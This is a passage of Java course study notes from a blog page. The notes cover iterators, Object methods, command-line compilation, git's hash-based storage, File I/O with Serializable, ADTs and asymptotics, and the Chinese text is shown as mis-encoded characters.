key-value mappings in this map. */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> size;<br>    &#125;<br><br>    <span class="hljs-comment">/** returns an iterator (a.k.a. seer) into ME */</span><br>    <span class="hljs-keyword">public</span> Iterator&lt;T&gt; <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArraySetIterator</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArraySetIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span>&lt;T&gt; &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> wizPos;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">ArraySetIterator</span><span class="hljs-params">()</span> &#123;<br>            wizPos = <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> wizPos &lt; size;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> T <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-type">T</span> <span class="hljs-variable">returnItem</span> <span class="hljs-operator">=</span> items[wizPos];<br>            wizPos += <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> returnItem;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ArraySet&lt;Integer&gt; aset = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArraySet</span>&lt;&gt;();<br>        aset.add(<span class="hljs-number">5</span>);<br>        aset.add(<span class="hljs-number">23</span>);<br>        aset.add(<span class="hljs-number">42</span>);<br><br>        <span class="hljs-comment">//iteration</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : aset) &#123;<br>            System.out.println(i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Object-Methods"><a href="#Object-Methods" class="headerlink" title="Object Methods"></a>Object Methods</h2><p>æ‰€æœ‰ç±»éƒ½ç»§æ‰¿è‡ªæ€»ä½“ Object ç±»ã€‚ç»§æ‰¿çš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object obj)</span><br>Class &lt;?&gt; getClass()<br><span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span><br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">Objectclone</span><span class="hljs-params">()</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">finalize</span><span class="hljs-params">()</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">notify</span><span class="hljs-params">()</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyAll</span><span class="hljs-params">()</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">wait</span><span class="hljs-params">()</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">wait</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout)</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">wait</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, <span class="hljs-type">int</span> nanos)</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¯¹è¿™äº›æ–¹æ³•è¿›è¡Œé‡å†™ã€‚</p><h1 id="Lecture-12-notes-Preview-of-Project-2"><a href="#Lecture-12-notes-Preview-of-Project-2" class="headerlink" title="Lecture 12 notes: Preview of Project 2"></a>Lecture 12 notes: Preview of Project 2</h1><h2 id="Command-Line-Compliation"><a href="#Command-Line-Compliation" class="headerlink" title="Command Line Compliation"></a>Command Line Compliation</h2><p>The standard tools for executing java programs use to step process:<br>Hello.java &#x3D;&#x3D;&gt; javac (Compiler) &#x3D;&#x3D;&gt; Hello.class &#x3D;&#x3D;&gt; java (Interpreter) &#x3D;&#x3D;&gt; code</p><h2 id="psvm"><a href="#psvm" class="headerlink" title="psvm"></a>psvm</h2><p>Javaä¸­çš„mainå‡½æ•°çš„åŸºæœ¬å½¢å¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œargså‚¨å­˜äº†å‘½ä»¤è¡Œå‚æ•°ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬æœ‰è¿™æ ·ä¸€ä¸ªç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(args[<span class="hljs-number">0</span>]);<br>        System.out.println(args[<span class="hljs-number">1</span>]);<br>        System.out.println(args[<span class="hljs-number">2</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨å‘½ä»¤è¡Œå†…æ‰§è¡Œ</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>javac Hello<br><span class="hljs-variable">$ </span>java Hello x y z<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä¼šå¾—åˆ°è¾“å‡ºx y zã€‚</p><h2 id="Gitï¼šA-Command-Line-Tool"><a href="#Gitï¼šA-Command-Line-Tool" class="headerlink" title="Gitï¼šA Command Line Tool"></a>Gitï¼šA Command Line Tool</h2><p>gitæ˜¯ä¸€ä¸ªç”¨Cè¯­è¨€ç¼–å†™çš„command line program</p><p>gitæä¾›äº†ä¸€ä¸ªä¾¿æ·çš„ Version Control å·¥å…·ã€‚</p><p>å­¦ä¹ Git æ‰¾åˆ°ä¸€ä¸ªç½‘ç«™ï¼š<a href="https://learngitbranching.js.org/?demo=&locale=zh_CN">https://learngitbranching.js.org/?demo=&amp;locale=zh_CN</a></p><p>å½“æˆ‘ä»¬æ¯æ¬¡æäº¤(commit changes)æ—¶ï¼Œgitéƒ½å‚¨å­˜äº†ä¸€ä¸ªæ•´ä¸ªrepositoryçš„copyå¹¶ä¿å­˜åœ¨éšè—æ–‡ä»¶å¤¹ .git ä¸‹ã€‚</p><p>æˆ‘ä»¬å‡è®¾ä¸€ä¸ªç¨‹åºå‘˜ç»å†äº†ä¸‹é¢ä¸‰ä¸ªæ­¥éª¤ï¼š</p><ol><li>V1ï¼šCreate readme.md</li><li>V2: Create some files, modify readme.md</li><li>V3: Modify some files, change readme.md to V1 version</li></ol><p>æœ€è‡ªç„¶çš„æƒ³æ³•æ˜¯åœ¨æ¯æ¬¡æäº¤æ—¶éƒ½ä¿å­˜ä¸€ä»½å½“å‰çŠ¶æ€çš„å‰¯æœ¬ï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•çš„ç¼ºç‚¹ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ã€‚</p><p>ç¨åŠ æ”¹è¿›ï¼Œæˆ‘ä»¬å‘ç°æ¯æ¬¡æäº¤æ—¶ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«ä¿®æ”¹ï¼Œå› æ­¤åœ¨ä¸‹ä¸€æ¬¡æäº¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥ä¸Šä¸€æ¬¡ä¿å­˜çš„å‰¯æœ¬ä¸­æ˜¯å¦å«æœ‰ç›¸åŒçš„æ–‡ä»¶ï¼Œå¹¶å°†æœ¬æ¬¡ä¿å­˜çš„å‰¯æœ¬çš„ç›¸å…³æ–‡ä»¶ç”¨æŒ‡é’ˆæŒ‡å‘ä¸Šä¸€æ¬¡çš„ç›¸åŒæ–‡ä»¶ï¼Œè¿™æ ·å°±é¿å…äº†åŒä¸€ä»½æ–‡ä»¶ä¿å­˜å¤šæ¬¡ï¼ˆæŒ‡é’ˆåªæ˜¯å½¢è±¡çš„è¯´æ˜ï¼ŒJavaæ²¡æœ‰æŒ‡é’ˆ :Pï¼‰ã€‚</p><p>åœ¨Javaä¸­ï¼Œè¿™ç§æŒ‡å‘çš„ä¸€å¯¹ä¸€çš„é”®å€¼å¯¹å…³ç³»å¯ä»¥ç”¨mapæ¥ä¿å­˜ã€‚mapçš„é”®ä¸ºä¿å­˜çš„æ–‡ä»¶ï¼Œå€¼è®°ä¸ºç‰ˆæœ¬å·ã€‚</p><p>ä¾‹å¦‚:</p><p>V1: X.java -&gt; v1, Y.java -&gt; v1<br>V2: X.java -&gt; v1, Y.java -&gt; v2<br>V3: X.java -&gt; v1, Y.java -&gt; v2, Z.java -&gt; v3<br>V4: X.java -&gt; v4, Y.java -&gt; v2, Z.java -&gt; v3, A.java -&gt; v4</p><p>è¿™è¡¨ç¤ºåœ¨V4ä¸­ï¼ŒX.javaä½¿ç”¨v4å½“ä¸­ä¿®æ”¹çš„ç‰ˆæœ¬ï¼ŒY.javaä½¿ç”¨v2ä¸­ä¿®æ”¹çš„ç‰ˆæœ¬ï¼Œä»¥æ­¤ç±»æ¨ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä¿å­˜çš„å¹¶ä¸æ˜¯æ–‡ä»¶çš„å†…å®¹ä¿¡æ¯ï¼Œè€Œæ˜¯â€œY.java V4å…·æœ‰å’ŒV2ç›¸åŒå†…å®¹â€è¿™ä¸€ä¿¡æ¯ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘ä¸‹é¢çš„æƒ…æ™¯ï¼š</p><p>Aå’ŒBåŒæ—¶ä»V3å¼€å§‹ä¿®æ”¹ï¼ŒAä¿®æ”¹äº†Horse.java è€ŒBä¿®æ”¹äº†Fish.javaï¼Œä¸¤äººéƒ½è¿›è¡Œäº†æäº¤ï¼Œè¿™æ—¶V4åº”è¯¥æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œgitä¸­çš„ç‰ˆæœ¬å·ä½¿ç”¨æäº¤æ—¶é—´æ¥å®šä¹‰ï¼Œè¿™å¤§å¤§é™ä½äº†ç‰ˆæœ¬å†²çªçš„é—®é¢˜ï¼Œä½†ä»ç„¶å­˜åœ¨å¤šäººåŒæ—¶æäº¤çš„å¯èƒ½æ€§ã€‚</p><p>æ‰€ä»¥gitä½¿ç”¨åŸºäºå†…å®¹ç¡®å®šçš„SHA-1 hashå€¼ä½œä¸ºç‰ˆæœ¬å·ï¼Œå¯¹äºåŒä¸€ä¸ªå€¼ï¼Œå¯¹åº”çš„Hashå€¼ä¹Ÿç›¸åŒï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå•å€¼å‡½æ•°ã€‚</p><p>ç¬¬ä¸€æ­¥ï¼Œgitè®¡ç®—å‡º SHA-1 hashå€¼<br>Hello.java &#x3D;&gt; 66ccdc645â€¦<br>ç¬¬äºŒæ­¥ï¼Œgitåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä»¥å‰ä¸¤ä¸ªæ•°å­—ä¸ºæ ‡è¯†<br>.git&#x2F;objects&#x2F;66<br>ç¬¬ä¸‰æ­¥ï¼Œgitå‚¨å­˜å†…å®¹åœ¨é™¤å»å‰ä¸¤ä¸ªæ•°ä¹‹åå‰©ä¸‹éƒ¨åˆ†(ccdc645â€¦)å‘½åçš„zlibæ–‡ä»¶ä¸­ã€‚</p><p>å½“æ–‡æ¡£çš„å†…å®¹æ”¹å˜æ—¶ï¼Œhashå€¼ä¹Ÿä¼šæ”¹å˜ï¼Œé¿å…äº†ç‰ˆæœ¬åå†²çªã€‚</p><p>æ¯ä¸€ä¸ªcommitéƒ½åŒ…å«äº†hashå€¼ã€ä½œè€…ã€æ—¶é—´å’Œmessageã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Serializableæ¥å£æ¥å®ç°å¯¹æ–‡ä»¶çš„æ“ä½œã€‚</p><p>åœ¨gitä¸­ï¼Œæˆ‘ä»¬æ‹¥æœ‰ä¸åŒçš„åˆ†æ”¯ä»¥ä¾¿å‚¨å­˜ä¸åŒçš„å†…å®¹ã€‚åœ¨ç°å®ä¸­ï¼Œä¸¤ä¸ªå›¢é˜Ÿå¯èƒ½ä»åŒä¸€ä¸ªåˆå§‹çŠ¶æ€å¼€å§‹å®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆç”¨ä¸åŒçš„åˆ†æ”¯è¿›è¡Œåˆ†éš”æ˜¯å¿…è¦çš„ã€‚</p><p><img src="/Pictures/CS61b/02/branching.png" alt="img"></p><p>åœ¨å®Œæˆä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨mergeå‘½ä»¤å¯¹åˆ†æ”¯è¿›è¡Œåˆå¹¶ã€‚åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç”¨åˆ°äº†Graphçš„æ•°æ®ç»“æ„</p><p><img src="/Pictures/CS61b/02/merge.png" alt="img"></p><p>åœ¨gitä¸­ï¼Œè¿ç”¨åˆ°äº†ä¸€äº›ç‰¹æ®Šçš„æ•°æ®ç»“æ„çŸ¥è¯†ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€çŸ­çš„preview</p><ul><li>Maps</li><li>Hashing</li><li>File I&#x2F;O</li><li>Graphs</li></ul><h2 id="File"><a href="#File" class="headerlink" title="File"></a>File</h2><p>ä½¿ç”¨Fileæ„é€ å‡½æ•°åœ¨Javaä¸­åˆ›é€ å‡ºä¸€ä¸ªFileå¯¹è±¡ï¼Œå¹¶ä¼ å…¥æ–‡ä»¶è·¯å¾„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;dummy.txt&quot;</span>);<br><span class="hljs-comment">// Create a new file</span><br>f.createNewFile();<br><span class="hljs-comment">// Check if exists</span><br>f.exists();<br><span class="hljs-comment">// Use utils.java to write a String to a file</span><br>Utils.writeContents(f, <span class="hljs-string">&quot;Hello world!&quot;</span>);<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªä»£è¡¨ç›®å½•çš„Fileå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">File</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;dummy&quot;</span>);<br>d.mkdir();<br></code></pre></td></tr></table></figure><h2 id="Serializable"><a href="#Serializable" class="headerlink" title="Serializable"></a>Serializable</h2><p>å®ç°Serializableæ¥å£çš„ç±»è¡¨æ˜å®ƒä»¬å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œå³å¯ä»¥å°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼Œä»¥ä¾¿åœ¨ç½‘ç»œä¸Šä¼ è¾“æˆ–ä¿å­˜åˆ°æŒä¹…å­˜å‚¨ä¸­ï¼Œä¹Ÿå¯ä»¥å°†å­—èŠ‚åºåˆ—é‡æ–°è½¬æ¢å›å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Model</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥æ¥å£æ²¡æœ‰æ–¹æ³•ï¼›å®ƒåªæ˜¯ä¸ºäº†ä¸€äº›ç‰¹æ®Šçš„ Java ç±»åœ¨å¯¹è±¡ä¸Šæ‰§è¡Œ I&#x2F;O çš„å¥½å¤„è€Œæ ‡è®°å…¶å­ç±»å‹ã€‚ä¾‹å¦‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Model</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ....;<br><span class="hljs-type">File</span> <span class="hljs-variable">outFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(saveFileName);<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(outFile));<br>    out.writeObject(m);<br>    out.close();<br>&#125; <span class="hljs-keyword">catch</span> (IOException excp) &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼šå°† m è½¬æ¢ä¸ºå­—èŠ‚æµå¹¶å°†å…¶å­˜å‚¨åœ¨åç§°å­˜å‚¨åœ¨ saveFileName ä¸­çš„æ–‡ä»¶ä¸­ã€‚ç„¶åå¯ä»¥ä½¿ç”¨è¯¸å¦‚ä»¥ä¸‹çš„ä»£ç åºåˆ—æ¥é‡å»ºè¯¥å¯¹è±¡:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Model m;<br><span class="hljs-type">File</span> <span class="hljs-variable">inFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(saveFileName);<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inp</span> <span class="hljs-operator">=</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(inFile));<br>    m = (Model) inp.readObject();<br>    inp.close();<br>&#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException excp) &#123;<br>    ...<br>    m = <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ utils.java é‡å†™ä»£ç å¯ä»¥ä½¿ä»£ç æ›´åŠ ç®€æ´</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Model m;<br><span class="hljs-type">File</span> <span class="hljs-variable">outFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(saveFileName);<br><span class="hljs-comment">// Serializing the Model object</span><br>writeObject(outFile, m);<br><br>Model m;<br><span class="hljs-type">File</span> <span class="hljs-variable">inFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(saveFileName);<br><span class="hljs-comment">// Deserializing the Model object</span><br>m = readObject(inFile, Model.class);<br></code></pre></td></tr></table></figure><h1 id="Efficient-Programming"><a href="#Efficient-Programming" class="headerlink" title="Efficient Programming"></a>Efficient Programming</h1><h2 id="ADT"><a href="#ADT" class="headerlink" title="ADT"></a>ADT</h2><p>ADTï¼ˆæŠ½è±¡æ•°æ®ç»“æ„ï¼‰æ˜¯ç”±å…¶è¡Œä¸ºè€Œä¸æ˜¯å…¶å®ç°å®šä¹‰çš„é«˜çº§ç±»å‹ã€‚</p><p>Proj1 ä¸­çš„ Deque æ˜¯ä¸€ä¸ªå…·æœ‰æŸäº›è¡Œä¸ºï¼ˆaddFirstã€addLast ç­‰ï¼‰çš„ ADTã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å®é™…ç”¨æ¥å®ç°å®ƒçš„æ•°æ®ç»“æ„æ˜¯ ArrayDeque å’Œ LinkedListDeque</p><ul><li>æ•°æ®å°è£…ï¼š ADT å°†æ•°æ®å’Œæ“ä½œå°è£…åœ¨ä¸€èµ·ï¼Œä½¿å¾—æ•°æ®çš„å†…éƒ¨ç»“æ„å¯¹å¤–éƒ¨æ˜¯ä¸å¯è§çš„ã€‚</li><li>æ“ä½œå®šä¹‰ï¼š ADT å®šä¹‰äº†æ•°æ®ç±»å‹æ”¯æŒçš„æ“ä½œï¼Œå¹¶æè¿°äº†è¿™äº›æ“ä½œçš„è¡Œä¸ºã€‚</li><li>ç‹¬ç«‹æ€§ï¼š ADT çš„å®ç°å¯ä»¥ç‹¬ç«‹äºä½¿ç”¨å®ƒçš„ç¨‹åºã€‚</li></ul><p>ä¸€äº›å¸¸ç”¨çš„ ADT æ˜¯ï¼š</p><ul><li><p>Stacks:æ”¯æŒå…ƒç´ åè¿›å…ˆå‡ºæ£€ç´¢çš„ç»“æ„<br>push(int x) ï¼šå°† x æ”¾å…¥å †æ ˆé¡¶éƒ¨<br>int pop() ï¼šå–å‡ºæ ˆé¡¶å…ƒç´ </p></li><li><p>Listsï¼šä¸€ç»„æœ‰åºçš„å…ƒç´ <br>add(int i) ï¼šæ·»åŠ ä¸€ä¸ªå…ƒç´ <br>int get(int i) ï¼šè·å–ç´¢å¼• i å¤„çš„å…ƒç´ </p></li><li><p>Sets:ä¸€ç»„æ— åºçš„å”¯ä¸€å…ƒç´ ï¼ˆæ— é‡å¤ï¼‰<br>add(int i) ï¼šæ·»åŠ ä¸€ä¸ªå…ƒç´ <br>contains(int i) ï¼šè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºé›†åˆæ˜¯å¦åŒ…å«è¯¥å€¼</p></li><li><p>Maps: é”®&#x2F;å€¼å¯¹çš„é›†åˆ<br>put(K key, V value) ï¼šå°†é”®å€¼å¯¹æ”¾å…¥æ˜ å°„ä¸­<br>V get(K key) ï¼šè·å–keyå¯¹åº”çš„å€¼</p></li></ul><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p>ADT çš„ APIï¼ˆåº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼‰æ˜¯æ„é€ å‡½æ•°å’Œæ–¹æ³•çš„åˆ—è¡¨ä»¥åŠæ¯ä¸ªæ„é€ å‡½æ•°å’Œæ–¹æ³•çš„ç®€çŸ­æè¿°ã€‚</p><p>APIç”±å¥æ³•å’Œè¯­ä¹‰è§„èŒƒç»„æˆã€‚</p><ul><li>è§„èŒƒæ€§ï¼š API æä¾›äº†ä¸€ç»„è§„èŒƒï¼Œå®šä¹‰äº†å¦‚ä½•ä½¿ç”¨è½¯ä»¶ç»„ä»¶æˆ–æœåŠ¡ã€‚</li><li>æŠ½è±¡æ€§ï¼š API å±è”½äº†åº•å±‚å®ç°ç»†èŠ‚ï¼Œä½¿å¼€å‘è€…å¯ä»¥ä¸“æ³¨äºä½¿ç”¨è€Œä¸æ˜¯å®ç°ç»†èŠ‚ã€‚</li><li>äº’æ“ä½œæ€§ï¼š API ä¿ƒè¿›äº†ä¸åŒè½¯ä»¶ç³»ç»Ÿä¹‹é—´çš„äº’æ“ä½œæ€§å’Œé›†æˆã€‚</li></ul><h2 id="Asymptotics"><a href="#Asymptotics" class="headerlink" title="Asymptotics"></a>Asymptotics</h2><p>ä¸»è¦æ¦‚å¿µï¼š</p><ol><li><p>æ—¶é—´å¤æ‚åº¦ï¼š æ—¶é—´å¤æ‚åº¦æè¿°äº†ç®—æ³•æ‰§è¡Œæ‰€éœ€æ—¶é—´ä¸è¾“å…¥è§„æ¨¡ä¹‹é—´çš„å…³ç³»ã€‚é€šå¸¸ä»¥å¤§ O è¡¨ç¤ºæ³•æ¥è¡¨ç¤ºï¼Œè¡¨ç¤ºç®—æ³•çš„æ¸è¿›ä¸Šç•Œã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º O(n)ï¼Œåˆ™è¡¨ç¤ºç®—æ³•çš„è¿è¡Œæ—¶é—´ä¸è¾“å…¥è§„æ¨¡æˆçº¿æ€§å…³ç³»ã€‚</p></li><li><p>ç©ºé—´å¤æ‚åº¦ï¼š ç©ºé—´å¤æ‚åº¦æè¿°äº†ç®—æ³•åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ‰€éœ€çš„å†…å­˜ç©ºé—´ä¸è¾“å…¥è§„æ¨¡ä¹‹é—´çš„å…³ç³»ã€‚ä¹Ÿé€šå¸¸ä»¥å¤§ O è¡¨ç¤ºæ³•æ¥è¡¨ç¤ºã€‚</p></li><li><p>æ¸è¿›åˆ†æï¼š æ¸è¿›åˆ†ææ˜¯æŒ‡å¯¹ç®—æ³•æ€§èƒ½è¿›è¡Œé¢„æµ‹æ—¶ï¼Œä¸»è¦è€ƒè™‘éšç€è¾“å…¥è§„æ¨¡çš„å¢é•¿ï¼Œç®—æ³•çš„è¿è¡Œæ—¶é—´æˆ–ç©ºé—´å ç”¨çš„å˜åŒ–è¶‹åŠ¿ã€‚åœ¨è¿™ç§åˆ†æä¸­ï¼Œæˆ‘ä»¬æ›´å…³æ³¨ç®—æ³•çš„å¢é•¿ç‡è€Œä¸æ˜¯ç¡®åˆ‡çš„è¿è¡Œæ—¶é—´æˆ–ç©ºé—´ã€‚</p></li><li><p>æœ€åæƒ…å†µå¤æ‚åº¦ï¼š æœ€åæƒ…å†µå¤æ‚åº¦æè¿°äº†ç®—æ³•åœ¨æœ€åæƒ…å†µä¸‹çš„æ—¶é—´æˆ–ç©ºé—´å¼€é”€ã€‚è¿™ç»™å‡ºäº†ç®—æ³•æ€§èƒ½çš„ä¸€ä¸ªä¿è¯ï¼Œå³ç®—æ³•åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸ä¼šæ¯”æœ€åæƒ…å†µæ›´å·®ã€‚</p></li><li><p>å¹³å‡æƒ…å†µå¤æ‚åº¦ï¼š å¹³å‡æƒ…å†µå¤æ‚åº¦æè¿°äº†ç®—æ³•åœ¨å¹³å‡æƒ…å†µä¸‹çš„æ—¶é—´æˆ–ç©ºé—´å¼€é”€ã€‚è¿™éœ€è¦è€ƒè™‘æ‰€æœ‰å¯èƒ½è¾“å…¥çš„æ¦‚ç‡åˆ†å¸ƒï¼Œå¹¶è®¡ç®—å¹³å‡æ€§èƒ½ã€‚</p></li><li><p>æœ€ä¼˜ç®—æ³•ï¼š æœ€ä¼˜ç®—æ³•æ˜¯æŒ‡åœ¨ç»™å®šé—®é¢˜ä¸Šå…·æœ‰æœ€ä½æ—¶é—´å¤æ‚åº¦æˆ–ç©ºé—´å¤æ‚åº¦çš„ç®—æ³•ã€‚æ‰¾åˆ°æœ€ä¼˜ç®—æ³•é€šå¸¸æ˜¯è§£å†³ç‰¹å®šé—®é¢˜çš„ç›®æ ‡ä¹‹ä¸€ã€‚</p></li></ol><p>è¿™ç« 